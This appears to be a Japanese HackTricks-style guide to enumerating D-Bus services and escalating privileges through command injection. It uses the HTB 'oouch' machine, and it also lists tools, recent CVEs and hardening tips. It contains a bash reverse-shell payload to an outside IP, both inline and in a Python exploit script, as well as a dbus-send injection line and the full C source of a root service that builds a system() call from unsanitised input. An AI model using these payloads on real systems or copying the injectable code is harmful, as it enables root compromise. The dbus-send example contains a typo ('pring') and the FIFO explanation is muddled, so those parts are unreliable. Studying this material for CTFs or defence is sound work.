# D-Bus Enumeration & Command Injection Privilege Escalation

## **GUI enumeration**

D-BusはUbuntu desktop environmentsにおけるinter-process communications (IPC) mediatorとして利用されています。Ubuntuでは、複数のmessage busが同時に動作しています。system busは主に、**システム全体に関連するserviceを公開するprivileged servicesによって利用**され、各ログインユーザーには、そのユーザー固有の関連serviceのみを公開するsession busがあります。ここでは、より高いprivileges（例：root）で動作するserviceに関連するため、主にsystem busに焦点を当てます。これはprivilegeを昇格させることが目的だからです。D-Busのarchitectureでは、各session busに1つの「router」が存在し、clientが通信を希望するserviceのaddressに基づいて、client messagesを適切なserviceへredirectする役割を担っている点に注意してください。<sup>[[1]](#references)</sup>

D-Bus上のserviceは、公開する**objects**と**interfaces**によって定義されます。objectsは一般的なOOP languagesにおけるclass instancesにたとえることができ、各instanceは**object path**によって一意に識別されます。このpathはfilesystem pathに似ており、serviceが公開する各objectを一意に識別します。調査目的で重要なinterfaceは、単一のmethodであるIntrospectを備えた**org.freedesktop.DBus.Introspectable** interfaceです。このmethodは、objectがサポートするmethods、signals、propertiesをXML形式で返します。ここではpropertiesとsignalsを省略し、methodsに焦点を当てます。

D-Bus interfaceとの通信には、2つのtoolsを使用しました。1つは、D-Busが公開するmethodsをscriptsから簡単に呼び出すためのCLI toolである**gdbus**です。もう1つは、各busで利用可能なservicesをenumerateし、各serviceに含まれるobjectsを表示するために設計されたPython-based GUI tool、[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)です。
```bash
sudo apt-get install d-feet
```
**session bus**を確認している場合は、まず現在のアドレスを確認します。
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

最初の画像には、D-Bus system bus に登録された services が表示されており、System Bus ボタンを選択した後に **org.debin.apt** が特に強調表示されています。D-Feet はこの service に対して objects を照会し、2 番目の画像に示されているように、選択した objects の interfaces、methods、properties、signals を表示します。各 method の signature も詳細に表示されます。

注目すべき機能として、service の **process ID (pid)** と **command line** が表示されます。これは、その service が elevated privileges で実行されているかを確認するのに役立ち、research relevance の観点で重要です。

**D-Feet では method invocation も可能です**。ユーザーは parameters として Python expressions を入力でき、D-Feet はそれらを D-Bus types に変換してから service に渡します。

ただし、**一部の methods では invocation を許可する前に authentication が必要です**。そもそも私たちの目標は credentials なしで privileges を elevate することなので、これらの methods は無視します。

また、一部の services は、ユーザーに特定の actions の実行を許可すべきかどうかを、org.freedeskto.PolicyKit1 という別の D-Bus service に問い合わせます。

## **Cmd line Enumeration**

### List Service Objects

次のコマンドで、開かれている D-Bus interfaces を一覧表示できます。
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
**`(activatable)`** とマークされた Services は、**まだ実行されていない**ものの、bus request によってオンデマンドで起動できるため、特に興味深い対象です。`busctl list` だけで終わらせず、それらの名前を、実際に実行されるバイナリに対応付けてください。
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
これにより、activatable name に対してどの `Exec=` パスが起動され、どの identity で実行されるのかがすぐに分かります。binary またはその実行チェーンの保護が不十分な場合、inactive service が依然として privilege escalation の経路になる可能性があります。

#### Connections

[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) プロセスが bus への接続を確立すると、bus はその接続に _unique connection name_ と呼ばれる特別な bus name を割り当てます。この種類の bus name は不変です。つまり、接続が存在する限り変更されないことが保証されます。さらに重要なのは、bus の存続期間中に再利用できないことです。これは、同じプロセスが bus への接続を閉じて新しい接続を作成した場合でも、その bus への他の接続に同じ unique connection name が割り当てられることは決してないという意味です。Unique connection name は、通常は使用できないコロン文字で始まるため、簡単に識別できます。<sup>[[4]](#references)</sup>

### Service Object Info

次に、以下を使用して interface に関する情報を取得できます:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
また、bus nameを対応する`systemd` unitおよび実行ファイルのパスと照合します：
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
これは、privesc 中に重要となる運用上の疑問に答えます。**メソッド呼び出しが成功した場合、実際にアクションを実行する real binary と unit はどれか？**

### Service Object のインターフェースを一覧表示する

十分な権限が必要です。
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Service Object の Introspect Interface

この例では、`tree` パラメータを使用して検出された最新の interface が選択されていることに注目してください（_前のセクションを参照_）：
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
インターフェース `htb.oouch.Block` のメソッド `.Block`（私たちが注目しているもの）に注目してください。他の列にある「s」は、文字列を想定していることを意味している可能性があります。

危険な操作を試す前に、まず **read-oriented** またはその他の低リスクなメソッドを検証してください。これにより、構文が間違っている、到達可能だが拒否される、到達可能で許可されている、という3つのケースを明確に切り分けられます。
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus MethodsをPoliciesおよびActionsと関連付ける

Introspectionにより、**何を**呼び出せるかは分かりますが、その呼び出しが**なぜ**許可または拒否されるのかは分かりません。実際のprivesc triageでは通常、次の**3つのレイヤー**をまとめて調査する必要があります。

1. **Activation metadata**（`.service` filesまたは`SystemdService=`）を確認し、実際に実行されるbinaryとunitを把握する。
2. **D-Bus XML policy**（`/etc/dbus-1/system.d/`、`/usr/share/dbus-1/system.d/`）を確認し、誰が`own`、`send_destination`、または`receive_sender`を実行できるかを把握する。
3. **Polkit action files**（`/usr/share/polkit-1/actions/*.policy`）を確認し、default authorization model（`allow_active`、`allow_inactive`、`auth_admin`、`auth_self`、`org.freedesktop.policykit.imply`）を把握する。

Useful commands:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
D-Bus method と Polkit action の間に1:1の対応関係があると**仮定しない**でください。同じ method でも、変更対象の object や runtime context に応じて異なる action が選択される場合があります。そのため、実際の workflow は次のとおりです。

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` および関連する `.policy` files の grep
3. `busctl call`、`gdbus call`、または `dbusmap --enable-probes --null-agent` による低リスクの live probes

Proxy または compatibility services には特に注意してください。別の D-Bus service へ自身の事前確立済み connection を介して requests を転送する **root-running proxy** は、元の caller identity が再検証されない限り、backend にすべての request が UID 0 から送信されたものとして誤って扱わせる可能性があります。<sup>[[3]](#references)</sup>

### Monitor/Capture Interface

十分な privileges があれば（`send_destination` と `receive_sender` privileges だけでは不十分です）、**D-Bus communication を monitor**できます。

**communication を monitor**するには、**root である必要があります。** root になっても問題が見つかる場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) および [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。

> [!WARNING]
> D-Bus config file を設定して non root users に communication の sniffing を**許可する**方法を知っている場合は、**私に連絡してください**！

monitor する方法はいくつかあります：
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
次の例では、インターフェース `htb.oouch.Block` が監視され、**「**_**lalalalal**_**」というメッセージが miscommunication を通じて送信されます**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Wiresharkで開ける **pcapng** ファイルに結果を保存するには、`monitor` の代わりに `capture` を使用できます。
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### すべてのノイズをフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

バス上の情報が多すぎる場合は、次のように match rule を渡します：
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
複数のルールを指定できます。メッセージがいずれかのルールに一致すると、そのメッセージが出力されます。以下のようになります:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
[D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) で match rule の構文に関する詳細を確認できます。<sup>[[7]](#references)</sup>

### その他

`busctl` にはさらに多くのオプションがあります。[**すべてのオプションはこちら**](https://www.freedesktop.org/software/systemd/man/busctl.html)で確認できます。

## **脆弱なシナリオ**

HTB のホスト "oouch" 内のユーザー **qtc** として、_/etc/dbus-1/system.d/htb.oouch.Block.conf_ に配置された**予期しない D-Bus config file**を見つけることができます。
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
前の設定から、**この D-BUS 通信を介して情報を送受信するには、ユーザー `root` または `www-data` である必要があります**。

Docker コンテナ **aeb4525789d8** 内のユーザー **qtc** として、ファイル _/code/oouch/routes.py._ に dbus 関連のコードがあります。該当するコードは次のとおりです。
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
ご覧のとおり、これは **D-Bus interface に接続**し、**"Block" function**に「client_ip」を送信しています。

D-Bus connection の反対側では、C でコンパイルされた binary が実行されています。この code は、D-Bus connection で **IP address を待ち受け、`system` function を介して iptables を呼び出し**、指定された IP address を block しています。\
**`system` の呼び出しは command injection に対して意図的に脆弱**になっているため、次のような payload で reverse shell を作成できます: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

このページの最後には、**D-Bus application の完全な C code**があります。その中の 91〜97 行には、**`D-Bus object path`**と**`interface name`**が**登録されている方法**が記載されています。この情報は、D-Bus connection に情報を送信するために必要です:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
また、57行目では、この D-Bus communication に登録されている **唯一の method** が `Block` という名前であることがわかります（_**そのため、次のセクションでは payload が service object `htb.oouch.Block`、interface `/htb/oouch/Block`、および method name `Block` に送信されます**_）：
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

以下の Python code は、`block_iface.Block(runme)` を介して D-Bus connection の `Block` method に payload を送信します（_前の code チャンクから抽出されたものであることに注意してください_）：
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl と dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` は「Message Bus」にメッセージを送信するためのツールです。
- Message Bus – アプリケーション間の通信を容易にするためにシステムで使用されるソフトウェアです。Message Queue（メッセージが順番に並べられる）と関連していますが、Message Bus ではメッセージがサブスクリプションモデルで送信され、非常に高速です。
- 「-system」タグは、セッションメッセージではなくシステムメッセージであることを示すために使用されます（デフォルト）。
- 「–print-reply」タグは、メッセージを適切に出力し、返信がある場合は人間が読みやすい形式で受け取るために使用されます。
- 「–dest=Dbus-Interface-Block」は、Dbus interface のアドレスです。
- 「–string:」– interface に送信するメッセージのタイプです。メッセージの送信には、double、bytes、booleans、int、objpath など、いくつかの形式があります。このうち、「object path」は、ファイルのパスを Dbus interface に送信したい場合に便利です。この場合、特殊ファイル（FIFO）を使用して、ファイル名として interface にコマンドを渡せます。「string:;」– これは、FIFO の reverse shell ファイル/コマンドを配置した object path を再度呼び出すためのものです。

_`htb.oouch.Block.Block` では、最初の部分（`htb.oouch.Block`）が service object を参照し、最後の部分（`.Block`）が method name を参照することに注意してください。_

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automated Enumeration Helpers (2023-2025)

大規模な D-Bus attack surface を `busctl`/`gdbus` で手動列挙すると、すぐに困難になります。ここ数年でリリースされた 2 つの小規模な FOSS utility を使うと、red-team や CTF engagements 中の作業を高速化できます。

### dbusmap ("Nmap for D-Bus")
* 作者: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* C で記述された、単一の static binary（<50 kB）です。すべての object path を走査し、`Introspect` XML を取得して、所有する PID/UID にマッピングします。<sup>[[5]](#references)</sup>
* 有用な flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* この tool は、保護されていない well-known names に `!` を付けます。これにより、*own*（乗っ取り）できる service や、unprivileged shell から到達可能な method calls を即座に確認できます。

### uptux.py
* 作者: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* systemd units 内の *writable* paths と、過度に permissive な D-Bus policy files（例: `send_destination="*"`）を探す Python-only script です。<sup>[[6]](#references)</sup>
* Quick usage:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* D-Bus module は以下の directories を検索し、通常の user に spoof または hijack 可能な service を強調表示します。
* `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (vendor overrides)

---

## Notable D-Bus Privilege-Escalation Bugs (2024-2025)

最近公開された CVEs を常に確認しておくと、custom code における類似の insecure patterns を見つけやすくなります。最近の良い例は次の 2 つです:<sup>[[2]](#references)[[3]](#references)</sup>

| Year | CVE | Component | Root Cause | Offensive lesson |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | root で実行される service が、unprivileged users に再設定可能な D-Bus interface を公開していました。これには attacker-controlled な macro behavior の読み込みも含まれていました。 | **device/profile/config management** を system bus 上で公開する daemon では、writable configuration と macro features を単なる「settings」ではなく、code-execution primitives として扱う。 |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | root で実行される compatibility proxy が、元の caller の security context を保持せずに backend services へ requests を転送していたため、backends は proxy を UID 0 として信頼していました。 | **proxy / bridge / compatibility** D-Bus services は独立した bug class として扱う。privileged calls を relay する場合は、caller UID/Polkit context が backend にどのように伝達されるかを確認する。 |

注目すべき patterns:
1. Service が system bus 上で **root として実行される**。
2. **authorization check が存在しない**か、check が **誤った subject に対して実行される**。
3. 到達可能な method が最終的に system state を変更する: package install、user/group changes、bootloader config、device profile updates、file writes、または direct command execution。

`dbusmap --enable-probes` または手動の `busctl call` を使って method に到達可能か確認し、その後 service の policy XML と Polkit actions を調査して、実際に **どの subject** が authorization の対象になっているかを把握します。

---

## Hardening & Detection Quick-Wins

* world-writable または *send/receive*-open policies を検索します:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* 危険な methods には Polkit を必須にします。*root* proxies であっても、自身の PID ではなく *caller* PID を `polkit_authority_check_authorization_sync()` に渡す必要があります。
* 長時間実行される helpers では privileges を drop します（bus に接続した後、`sd_pid_get_owner_uid()` を使って namespaces を切り替えます）。
* Service を削除できない場合でも、少なくとも dedicated Unix group に *scope* し、XML policy で access を制限します。
* Blue-team: `busctl capture > /var/log/dbus_$(date +%F).pcapng` で system bus を capture し、Wireshark に import して anomaly detection を行います。

---

## References

- [1] [Ubuntu Desktop における USBCreator D-Bus Privilege Escalation](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus service が unprivileged user による configuration を許可](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Deepin D-Bus Proxy Service における Authentication Bypass (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus - Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap - "D-Bus 用の Nmap"](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org - D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
